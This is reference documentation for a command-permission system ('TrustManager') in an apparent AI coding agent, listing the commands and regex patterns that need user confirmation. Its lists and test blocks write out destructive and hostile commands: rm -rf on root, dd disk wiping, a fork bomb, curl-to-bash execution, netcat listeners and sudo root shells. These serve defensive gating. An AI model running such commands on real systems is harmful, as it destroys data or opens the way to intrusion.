# Sensitive Commands Reference

This document lists all commands and patterns that trigger permission prompts in the TrustManager.

## Extremely Sensitive Commands (No "Always Allow")

These commands **always** require explicit user confirmation and do NOT offer the "Always Allow" option.

### System Destruction
- `rm -rf /` - Delete root directory
- `rm -rf /*` - Delete all root contents
- `rm -rf ~` - Delete home directory
- `rm -rf ~/` - Delete home directory
- `rm -rf .` - Delete current directory
- `rm -rf ./` - Delete current directory
- `rm -rf --no-preserve-root /` - Force delete root
- `find / -delete` - Delete all files from root
- `find ~ -delete` - Delete all files from home

### Disk Operations
- `dd if=/dev/zero` - Disk wiping
- `> /dev/sda` - Write to disk device
- `mkfs` - Format filesystem
- `fdisk` - Disk partitioning
- `parted` - Disk partitioning

### System Operations
- `:(){ :|:& };:` - Fork bomb
- `shutdown` - System shutdown
- `poweroff` - Power off
- `reboot` - Reboot system
- `halt` - Halt system
- `systemctl poweroff` - Systemd power off
- `systemctl reboot` - Systemd reboot
- `systemctl halt` - Systemd halt

### Remote Code Execution
- `wget -O- | bash` - Download and execute
- `curl | bash` - Download and execute
- `wget | sh` - Download and execute
- `curl | sh` - Download and execute
- `curl -s | bash` - Silent download and execute

### Network Tools
- `nc -l` - Netcat listen mode
- `netcat -l` - Netcat listen mode
- `socat` - Bidirectional relay
- `ncat -l` - Ncat listen mode

### Privilege Escalation
- `sudo su` - Switch to root
- `sudo -i` - Root shell
- `sudo bash` - Root bash shell
- `sudo sh` - Root shell

### System Configuration
- `passwd` - Change password
- `usermod` - Modify user
- `userdel` - Delete user
- `groupmod` - Modify group
- `visudo` - Edit sudoers file

### Critical System Files
- `rm /etc/passwd` - Delete password file
- `rm /etc/shadow` - Delete shadow file
- `rm /boot/*` - Delete boot files

## Extremely Sensitive Patterns (Regex)

These patterns detect extremely dangerous commands even with variations:

### Recursive/Forced Deletion
- `/^rm\s+(-[rf]+|--recursive|--force).*/` - rm with -r or -f flags
- `/^rm\s+.*\*/` - rm with wildcards
- `/^rm\s+.*\s+.*/` - rm with multiple arguments

### Disk Operations
- `/dd\s+if=\/dev\/zero\s+of=/` - Disk wiping with dd
- `/>\s*\/dev\/sd[a-z]/` - Writing to disk devices

### Remote Execution
- `/curl\s+.+\s*\|\s*(bash|sh|zsh)/` - Piping curl to shell
- `/wget\s+.+\s*\|\s*(bash|sh|zsh)/` - Piping wget to shell

### Privilege Escalation
- `/ssh\s+.+\s+'.*'/` - SSH with commands
- `/sudo\s+(su|bash|sh|zsh)/` - sudo with shell

### Dangerous Permissions
- `/chmod\s+777\s+\/(\s|$)/` - 777 permissions on root
- `/chown\s+.*\s+\/(\s|$)/` - Ownership changes on root

### Wildcards and Pipes
- `/ls\s+.*\*/` - ls with wildcards
- `/\*.*\|/` - Commands with wildcards and pipes
- `/\/.*\*/` - Absolute paths with wildcards

### System Directories
- `/\/Users\/[^/]+\/\.[^/]+/` - Hidden directories in user home
- `/\/opt\//` - /opt directory
- `/\/usr\/local/` - /usr/local directory

### Command Execution
- `/eval\s+.+/` - eval with commands

## Sensitive Patterns (Allow "Always Allow")

These patterns require confirmation but allow the "Always Allow" option:

### Outside CWD Access
- `/ls\s+(-[alFhrt]+\s+)?(\.\.|\/|\~)[\/]?/` - ls outside CWD
- `/cat\s+(\.\.|\/|\~)[\/]?/` - cat outside CWD
- `/more\s+(\.\.|\/|\~)[\/]?/` - more outside CWD
- `/less\s+(\.\.|\/|\~)[\/]?/` - less outside CWD
- `/head\s+(\.\.|\/|\~)[\/]?/` - head outside CWD
- `/tail\s+(\.\.|\/|\~)[\/]?/` - tail outside CWD
- `/grep\s+.+\s+(\.\.|\/|\~)[\/]?/` - grep outside CWD
- `/find\s+(\.\.|\/|\~)[\/]?\s+/` - find outside CWD

### Single File Deletion
- `/^rm\s+[^\s\-\*]+$/` - rm single file (no flags, wildcards, or multiple args)

## Sensitive Command Prefixes

These command prefixes trigger sensitivity checks:

### Privilege
- `sudo ` - Privileged execution
- `su ` - Switch user

### File Operations
- `chown ` - Change ownership
- `chmod ` - Change permissions
- `rm -r` - Recursive delete
- `rm -f` - Force delete
- `mv /* ` - Move from root
- `cp /* ` - Copy from root
- `ln -s ` - Create symlink

### Network
- `wget ` - Network download
- `curl ` - Network transfer
- `ssh ` - Remote access
- `scp ` - Secure copy
- `rsync ` - Remote sync

### Directory Access (Outside CWD)
- `ls ..` - List parent directory
- `ls ../` - List parent directory
- `ls /` - List root
- `ls ~/` - List home
- `cat ../` - Cat from parent
- `cat /` - Cat from root
- `cat ~/` - Cat from home
- `grep ../` - Grep parent
- `grep /` - Grep root
- `grep ~/` - Grep home
- `find ../` - Find in parent
- `find /` - Find in root
- `find ~/` - Find in home
- `head ../` - Head from parent
- `head /` - Head from root
- `head ~/` - Head from home
- `tail ../` - Tail from parent
- `tail /` - Tail from root
- `tail ~/` - Tail from home

## Testing Commands

Use these commands to test sensitivity detection:

### Normal (No Prompt)
```bash
ls -la
pwd
echo "hello"
git status
npm install
```

### Sensitive (Prompt with "Always Allow")
```bash
rm file.txt
ls /
cat ../README.md
sudo apt update
```

### Extremely Sensitive (Prompt without "Always Allow")
```bash
rm -rf *
rm *.txt
sudo su
curl http://example.com | bash
dd if=/dev/zero of=/dev/sda
```

## Integration Examples

### Bash Tool
```typescript
import { TrustManager, SensitivityTier } from '../agent/TrustManager';

class BashTool extends BaseTool {
  async executeImpl(args: { command: string }) {
    const tier = this.trustManager.getCommandSensitivity('bash', { command: args.command });

    if (tier !== SensitivityTier.NORMAL) {
      // Requires confirmation
      await this.trustManager.checkPermission('bash', args, { command: args.command });
    }

    // Execute command
    // ...
  }
}
```

### Write Tool
```typescript
class WriteTool extends BaseTool {
  readonly requiresConfirmation = true;

  async executeImpl(args: { file_path: string; content: string }) {
    // Permission check handled by ToolManager based on requiresConfirmation
    // ...
  }
}
```

## Security Best Practices

1. **Never disable permission checks** in production
2. **Always validate** outside-CWD access
3. **Log** all permission decisions for audit
4. **Review** sensitive command lists regularly
5. **Test** new patterns before deploying
6. **Educate** users about security implications
7. **Monitor** auto-confirm mode usage
8. **Restrict** auto-confirm to CI/CD only

## Adding New Sensitive Commands

To add new commands to the sensitivity lists:

1. Determine appropriate tier (SENSITIVE vs EXTREMELY_SENSITIVE)
2. Add to appropriate array in `TrustManager.ts`:
   - `EXTREMELY_SENSITIVE_COMMANDS` for exact matches
   - `EXTREMELY_SENSITIVE_PATTERNS` for regex patterns
   - `SENSITIVE_PATTERNS` for sensitive patterns
   - `SENSITIVE_COMMAND_PREFIXES` for prefix matches
3. Add tests in `TrustManager.test.ts`
4. Update this documentation
5. Test thoroughly before deploying

## References

- Python implementation: `/Users/bhm128/CodeAlly/code_ally/trust.py`
- Security docs: `/Users/bhm128/code-ally/docs/implementation_description/SECURITY_TRUST_DOCUMENTATION.md`
- TrustManager: `/Users/bhm128/code-ally/src/agent/TrustManager.ts`
